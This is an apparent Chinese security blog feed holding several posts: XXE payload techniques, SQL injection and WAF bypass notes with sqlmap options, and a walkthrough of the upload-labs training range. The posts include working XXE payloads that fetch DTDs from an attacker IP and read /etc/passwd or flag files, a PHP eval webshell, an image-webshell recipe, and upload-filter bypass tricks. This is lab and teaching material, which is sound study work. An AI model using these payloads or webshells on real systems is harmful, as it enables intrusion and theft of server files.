。<br>这意味着未读取文件内容的WAF将不会读取文档中实体的声明。而指向未知实体的链接又会阻止XML解析器导致错误。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % stuff SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY hhh &quot;%start;%stuff;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="5-http协议被过滤"><a href="#5-http协议被过滤" class="headerlink" title="5.http协议被过滤"></a>5.http协议被过滤</h4><h5 id="1-data"><a href="#1-data" class="headerlink" title="1.data:&#x2F;&#x2F;"></a>1.data:&#x2F;&#x2F;</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编码内容--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-file"><a href="#2-file" class="headerlink" title="2.file:&#x2F;&#x2F;"></a>2.file:&#x2F;&#x2F;</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="3-php-filter"><a href="#3-php-filter" class="headerlink" title="3.php:&#x2F;&#x2F;filter"></a>3.php:&#x2F;&#x2F;filter</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h3 id="4-特殊利用"><a href="#4-特殊利用" class="headerlink" title="4.特殊利用"></a>4.特殊利用</h3><h4 id="1-svg"><a href="#1-svg" class="headerlink" title="1.svg"></a>1.svg</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">&lt;!--从当前文件夹读取文件可以使用/proc/self/cwd--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-excel"><a href="#2-excel" class="headerlink" title="2.excel"></a>2.excel</h4><p>利用EXCEL进行XXE攻击：<a href="https://xz.aliyun.com/t/3741">https://xz.aliyun.com/t/3741</a></p><p>首先用excel创建一个空白的xlsx，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir XXE &amp;&amp; cd XXE</span><br><span class="line">unzip ../XXE.xlsx</span><br></pre></td></tr></table></figure><p>将<code>[Content_Types].xml</code>改成恶意xml，再压缩回去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r ../poc.xlsx *</span><br></pre></td></tr></table></figure><h3 id="5-防御"><a href="#5-防御" class="headerlink" title="5.防御"></a>5.防御</h3><ul><li>方案一、使用开发语言提供的禁用外部实体的方法<br>PHP：libxml_disable_entity_loader(true);<br>其他语言:<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li><li>方案二、过滤用户提交的XML数据<br>关键词：<code>&lt;!DOCTYPE ，&lt;!ENTITY,SYSTEM</code>和<code>PUBLIC</code>。</li></ul><h3 id="6-练习靶场和工具"><a href="#6-练习靶场和工具" class="headerlink" title="6.练习靶场和工具"></a>6.练习靶场和工具</h3><p>发现xxe漏洞靶场-xxe-lab：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><p>vulnhub靶机：<a href="https://www.vulnhub.com/entry/xxe-lab-1,254/">https://www.vulnhub.com/entry/xxe-lab-1,254/</a></p><p>xxe安全漏洞自动化注射脚本工具XXEinjector：<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p><p>burp插件：commentator</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入补充</title>
      <link href="/2020/06/09/sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%85/"/>
      <url>/2020/06/09/sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h2 id="1-数据库注入流程"><a href="#1-数据库注入流程" class="headerlink" title="1.数据库注入流程"></a>1.数据库注入流程</h2><p>access数据库除外，常规的数据库注入流程</p><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>操作系统、数据库、网站脚本语言</p><p>明确提交方法参数类型</p><p>数据库名、数据库用户、数据库版本</p><p>其他：网站路径、后台等</p><h3 id="2-数据注入"><a href="#2-数据注入" class="headerlink" title="2.数据注入"></a>2.数据注入</h3><p>同数据库-配合数据进行后台或其他getshell</p><p>​1.低版本数据库</p><p>​暴力查询结合读取查询</p><p>​2.高版本数据库</p><p>​<code>information_schema</code>数据查询</p><h3 id="3-高权限注入"><a href="#3-高权限注入" class="headerlink" title="3.高权限注入"></a>3.高权限注入</h3><p>1.常规查询，也即2数据注入</p><p>2.跨库查询-利用注入进行跨数据库查询</p><p>3.文件读写-getshell</p><p>​1.存在魔术引导-编码或者宽字节绕过</p><p>​2.不存在魔术引导</p><p>4.命令执行-getshell</p><p>5.注册表读取-getshell</p><h3 id="4-bypass"><a href="#4-bypass" class="headerlink" title="4.bypass"></a>4.bypass</h3><h4 id="1-防注入"><a href="#1-防注入" class="headerlink" title="1.防注入"></a>1.防注入</h4><p>1.自带防御：魔术引导</p><p>2.内置函数：int等</p><p>3.自定义关键字</p><p>4.waf防护：安全狗、宝塔</p><p>前三种需要结合实际情况进行绕过</p><h4 id="2-bypasswaf"><a href="#2-bypasswaf" class="headerlink" title="2.bypasswaf"></a>2.bypasswaf</h4><p><a href="https://cnblogs.com/backlion/p/9721687.html">https://Cnblogs.com/backlion/p/9721687.html</a></p><p><a href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://Blog.csdn.net/nzjdsds/article/details/93740686</a></p><h5 id="1-数据操作"><a href="#1-数据操作" class="headerlink" title="1.数据操作"></a>1.数据操作</h5><p>大小写、加解密、编码解码、等价函数、特殊符号、反序列化、注释符混用</p><h5 id="2-提交方式"><a href="#2-提交方式" class="headerlink" title="2.提交方式"></a>2.提交方式</h5><p>更改提交方式</p><p>变异</p><h5 id="3-fuzz"><a href="#3-fuzz" class="headerlink" title="3.fuzz"></a>3.fuzz</h5><h5 id="4-数据库特性"><a href="#4-数据库特性" class="headerlink" title="4.数据库特性"></a>4.数据库特性</h5><p><code>/*!50001 slect * from test */ </code>但是只针对mysql有用，表示数据库是5.00.01以上才执行</p><p>实战中不一定知道有效版本号，可以写一个脚本fuzz</p><h5 id="5-垃圾数据溢出"><a href="#5-垃圾数据溢出" class="headerlink" title="5.垃圾数据溢出"></a>5.垃圾数据溢出</h5><h5 id="6-http参数污染"><a href="#6-http参数污染" class="headerlink" title="6.http参数污染"></a>6.http参数污染</h5><h5 id="7-sqlmap绕waf"><a href="#7-sqlmap绕waf" class="headerlink" title="7.sqlmap绕waf"></a>7.sqlmap绕waf</h5><p>sqlmap语法：<a href="https://cnblogs.com/bmjoker/p/9326258.html">https://cnblogs.com/bmjoker/p/9326258.html</a></p><h6 id="1-tamper"><a href="#1-tamper" class="headerlink" title="1.tamper"></a>1.tamper</h6><p>绕过脚本位于<code>sqlma/tamper</code>下，但自带的不怎么ok，是比赛用的，需要自写脚本</p><p>只需打开一个已有的脚本，将其payload替换为自己的即可,执行时只需指定参数：<code>--tamper=rdog.py</code></p><h6 id="2-修改数据特征"><a href="#2-修改数据特征" class="headerlink" title="2.修改数据特征"></a>2.修改数据特征</h6><p>但是这时还是不行，因为sqlmap数据包自带特征值（抓包可以指定参数到抓包工具监听的ip端口：<code>--proxy=http://ip:port</code>）</p><p><img src="image-20210724235917975.png" alt="image-20210724235917975"></p><p>其实在发现带tamper还是执行不成功时，可以用浏览器访问，将其成功访问的请求包与sqlmap的请求包对比来发现不同，这也是发现并解决其他工具被ban的思路之一</p><h6 id="3-UA"><a href="#3-UA" class="headerlink" title="3.UA"></a>3.UA</h6><p>绕过UA头的限制，可以使用参数：<code>--random-agent  //随机出现UA头</code></p><p> <img src="image-20210724235945422.png" alt="image-20210724235945422"></p><p><img src="image-20210725000117554.png" alt="image-20210725000117554"></p><h6 id="4-中转脚本"><a href="#4-中转脚本" class="headerlink" title="4.中转脚本"></a>4.中转脚本</h6><p>但是如果waf检测严格会发现数据包中其他信息是一样的，这个时候就要另写中转脚本了</p><p>1.自定义数据包</p><p>在sqlmap根目录下创建一个txt文件，自定义文件数据包内容，指定参数：-r 自定义文件名</p><p><img src="image-20210725000219949.png" alt="image-20210725000219949"></p><p><img src="image-20210725000230143.png" alt="image-20210725000230143"></p><p>sqlmap将会以其为数据包形式发送</p><p>2.中转脚本</p><h5 id="8-绕过流量检测"><a href="#8-绕过流量检测" class="headerlink" title="8.绕过流量检测"></a>8.绕过流量检测</h5><p>但是如果waf开启了cc检测，这时sqlmap还是会被拦截，这时有三种绕过方法</p><h6 id="1-爬虫白名单"><a href="#1-爬虫白名单" class="headerlink" title="1.爬虫白名单"></a>1.爬虫白名单</h6><p><img src="image-20210725000144388.png" alt="image-20210725000144388"></p><p><img src="image-20210725001423081.png" alt="image-20210725001423081"></p><h6 id="2-设置延迟"><a href="#2-设置延迟" class="headerlink" title="2.设置延迟"></a>2.设置延迟</h6><p>设置参数：<code>--delay 1</code></p><h6 id="3-ip代理池"><a href="#3-ip代理池" class="headerlink" title="3.ip代理池"></a>3.ip代理池</h6><h6 id="4-ip白名单"><a href="#4-ip白名单" class="headerlink" title="4.ip白名单"></a>4.ip白名单</h6><p>从网络层获取ip，伪造不了，若是获取客户端的ip可以修改数据头的以下五类来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for</span><br><span class="line">X-remote-ip</span><br><span class="line">X-originating-IP</span><br><span class="line">X-remote-addr</span><br><span class="line">X-real-ip</span><br></pre></td></tr></table></figure><h6 id="5-静态资源"><a href="#5-静态资源" class="headerlink" title="5.静态资源"></a>5.静态资源</h6><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件后缀名请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/sql.php/1.js?id=1</span><br></pre></td></tr></table></figure><h6 id="6-url白名单"><a href="#6-url白名单" class="headerlink" title="6.url白名单"></a>6.url白名单</h6><p>部分waf会设置默认的白名单列表，如admin&#x2F;manager&#x2F;system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ip/sql.php/admin.php?id=1</span><br><span class="line">http://ip/sql.php?a=/manage/&amp;b=../etc/passwd</span><br><span class="line">http://ip/../../../manage/../sql.asp?id=1</span><br><span class="line">waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们就可以通过/sql.php?a=/manage/&amp;b=../etc/passwd绕过waf</span><br></pre></td></tr></table></figure><h2 id="2-其他数据库"><a href="#2-其他数据库" class="headerlink" title="2.其他数据库"></a>2.其他数据库</h2><h3 id="1-access"><a href="#1-access" class="headerlink" title="1.access"></a>1.access</h3><p>access数据库与常规数据库相比没有数据库名，其数据库独立位于网站源码下面，所以不存在跨站注入</p><p>access注入更多的是猜（工具爆）字段名和表名，没有数据库，文件操作功能</p><p>access暴力破解猜不出来怎么办？</p><p>1.access偏移注入-解决列名获取不到的情况</p><p>2.查看登录框源代码的表单值或者观察url特征等也可以针对表名或者列名获取不到的情况</p><h3 id="2-mssql"><a href="#2-mssql" class="headerlink" title="2.mssql"></a>2.mssql</h3><p><a href="https://cnblogs.com/xiaoshaonian/p/6173644.html">https://cnblogs.com/xiaoshaonian/p/6173644.html</a></p><h3 id="3-mongodb"><a href="#3-mongodb" class="headerlink" title="3.mongodb"></a>3.mongodb</h3><p>Sqlmap不支持mongodb注入，对应工具：<a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a> 在linux上运行</p><p>靶场练习：<a href="https://mozhe.cn/bug/detail/YXIRYUJPYk1vQjAreHIweVAyMzVTUT09bW96aGUmozhe">https://mozhe.cn/bug/detail/YXIRYUJPYk1vQjAreHIweVAyMzVTUT09bW96aGUmozhe</a></p><p>靶场通过文章：<a href="https://blog.csdn.net/qq_39936434/article/details/95319449">https://blog.csdn.net/qq_39936434/article/details/95319449</a></p><h2 id="3-补充注入方式"><a href="#3-补充注入方式" class="headerlink" title="3.补充注入方式"></a>3.补充注入方式</h2><h3 id="1-json注入"><a href="#1-json注入" class="headerlink" title="1.json注入"></a>1.json注入</h3><h3 id="2-dnslog注入"><a href="#2-dnslog注入" class="headerlink" title="2.dnslog注入"></a>2.dnslog注入</h3><p> 解决盲注不能回显，效率低 </p><p>要有文件读写权限，高权限，</p><p>dnslog平台自搭建：<a href="https://github.com/ADOOODnslogSqlinj">https://github.com/ADOOODnslogSqlinj</a></p><h2 id="4-非常规注入"><a href="#4-非常规注入" class="headerlink" title="4.非常规注入"></a>4.非常规注入</h2><p> information被ban的绕过：<a href="http://www.cl4y.top/information%e8%a2%abban%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e8%bf%9b%e8%a1%8csql%e6%b3%a8%e5%85%a5/">http://www.cl4y.top/information%e8%a2%abban%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e8%bf%9b%e8%a1%8csql%e6%b3%a8%e5%85%a5/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/2020/06/07/JWT%E4%BB%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91case%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/06/07/JWT%E4%BB%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91case%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs通关记录</title>
      <link href="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>本文是upload-labs通关记录。</p><span id="more"></span><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>制作一个一句话木马：<code>&lt;?php @eval($_POST[1]);?&gt;</code></p><p>制作一个图片马：<code>copy 1.jpg/b +ma.php/a ma.jpg</code></p><p>图片马内容：<code>&lt;?php  fputs(fopen(&#39;xx.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;); ?&gt;</code></p><h3 id="Pass-01：前端js验证"><a href="#Pass-01：前端js验证" class="headerlink" title="Pass-01：前端js验证"></a>Pass-01：前端js验证</h3><p>随意选个马子传一下，结果秒显不允许</p><p><img src="image-20210215110356885.png" alt="image-20210215110356885"></p><p>猜测前端js检查了，验证前端代码</p><p><img src="image-20210215110544819.png" alt="image-20210215110544819"></p><p><strong>绕过</strong></p><p>关了浏览器的前端js验证。</p><p>当然你要是嫌关js麻烦，你传个图片马就o了</p><p>上传图片马，然后文件包含</p><p><img src="image-20210215154901813.png" alt="image-20210215154901813"></p><p>菜刀连接</p><p><img src="image-20210215154959908.png" alt="image-20210215154959908"></p><h3 id="Pass-02：MIME"><a href="#Pass-02：MIME" class="headerlink" title="Pass-02：MIME"></a>Pass-02：MIME</h3><p>老规矩，搞个马子传一下</p><p><img src="image-20210215122215429.png" alt="image-20210215122215429"></p><p>看一下后台源代码</p><p><img src="image-20210215122237531.png" alt="image-20210215122237531"></p><p><strong>绕过</strong>验证MIME类型的，抓包改一下MIME为image&#x2F;jpeg就o了</p><p>嫌抓包麻烦，直接传个图片马也可以。</p><h3 id="Pass-03：宽松的黑名单"><a href="#Pass-03：宽松的黑名单" class="headerlink" title="Pass-03：宽松的黑名单"></a>Pass-03：宽松的黑名单</h3><p><img src="image-20210215124206217.png" alt="image-20210215124206217"></p><p>一看黑名单验证，查看后台源码</p><p><img src="image-20210215124326909.png" alt="image-20210215124326909"></p><p>果然。</p><p><strong>绕过</strong></p><p>这个黑名单限制不是很全，找一个没有在限制里面的后缀就可以绕过，比如php3，但是当上传的这些文件要被当作php来执行，需要有以下条件：即Apache的httpd.conf有如下配置代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .ph3</span><br><span class="line">#配置里面有你所上传的后缀</span><br></pre></td></tr></table></figure><p>此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。</p><p>或者传个图片马</p><h3 id="Pass-04-htaccsess"><a href="#Pass-04-htaccsess" class="headerlink" title="Pass-04:.htaccsess"></a>Pass-04:.htaccsess</h3><p>找个马子试一下</p><p><img src="image-20210215125826838.png" alt="image-20210215125826838"></p><p>看了下后台，比较长，不好列举，就以提示给的tips列举</p><p><img src="image-20210215125736761.png" alt="image-20210215125736761"></p><p><strong>绕过</strong></p><p>可以看到没有限制.htaccsess文件，故可以上传.htaccsess文件绕过。内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>这样所有文件都会解析为php，然后再上传图片马，就可以解析为php</p><h3 id="Pass-05：后缀大小写"><a href="#Pass-05：后缀大小写" class="headerlink" title="Pass-05：后缀大小写"></a>Pass-05：后缀大小写</h3><p>查看后台，这回完犊子了，加了.htaccess</p><p><img src="image-20210215133655371.png" alt="image-20210215133655371"></p><p>仔细看后台源代码，并没有转换大小写</p><p><img src="image-20210215134635811.png" alt="image-20210215134635811"></p><p><strong>绕过</strong></p><p>更改马子的后缀大小写，例如：<code>ma.Php</code></p><h3 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06:空格绕过"></a>Pass-06:空格绕过</h3><p>仔细看后台源码</p><p><img src="image-20210215135013175.png" alt="image-20210215135013175"></p><p>相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个空格</p><h3 id="Pass-07：点绕过"><a href="#Pass-07：点绕过" class="headerlink" title="Pass-07：点绕过"></a>Pass-07：点绕过</h3><p>仔细看后台</p><p><img src="image-20210215140041505.png" alt="image-20210215140041505"></p><p>可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个“.”</p><h3 id="Pass-08-：-DATE"><a href="#Pass-08-：-DATE" class="headerlink" title="Pass-08 ：::$DATE"></a>Pass-08 ：::$DATE</h3><p>后台源码</p><p><img src="image-20210215140137448.png" alt="image-20210215140137448"></p><p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p><blockquote><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p></blockquote><p>简单讲就是在php+windows的情况下：如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名.且保持<code>&quot;::$DATA&quot;</code>之前的文件名。</p><p><em>注:仅windows适用</em></p><p><strong>绕过</strong></p><p>用burp将上传文件后缀改为:<code>xx.php::$DATA</code>即可</p><h3 id="Pass-09：点空格点"><a href="#Pass-09：点空格点" class="headerlink" title="Pass-09：点空格点"></a>Pass-09：点空格点</h3><p>后台</p><p><img src="image-20210215140532614.png" alt="image-20210215140532614"></p><p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。</p><p><strong>绕过</strong></p><p>抓包构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code></p><h3 id="Pass-10：双写绕过"><a href="#Pass-10：双写绕过" class="headerlink" title="Pass-10：双写绕过"></a>Pass-10：双写绕过</h3><p>后台</p><p><img src="image-20210215141032311.png" alt="image-20210215141032311"></p><p>分析注意：<strong>str_ireplace</strong>函数<strong>不区分大小写</strong>的替换字符串中的一些字符，此次源码将黑名单里的文件后缀名替换成空字符。</p><p><strong>绕过</strong></p><p>用burp修改后缀名为 <code>.pphphp</code></p><h3 id="Pass-11：00截断"><a href="#Pass-11：00截断" class="headerlink" title="Pass-11：00截断"></a>Pass-11：00截断</h3><p>查看后台源码</p><p><img src="image-20210215141813823.png" alt="image-20210215141813823"></p><p>这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。但是在进行move_uploaded_file前。利用<code>GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。</p><p><strong>绕过</strong></p><p>00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p><blockquote><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p></blockquote><p>抓包进行修改</p><p><img src="image-20210215142538909.png" alt="image-20210215142538909"></p><p><img src="image-20210215142754495.png" alt="image-20210215142754495"></p><h3 id="Pass-12：-00"><a href="#Pass-12：-00" class="headerlink" title="Pass-12：%00"></a>Pass-12：%00</h3><p>后台源码</p><p><img src="image-20210215143512734.png" alt="image-20210215143512734"></p><p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。</p><p><strong>绕过</strong></p><p><img src="image-20210215145042313.png" 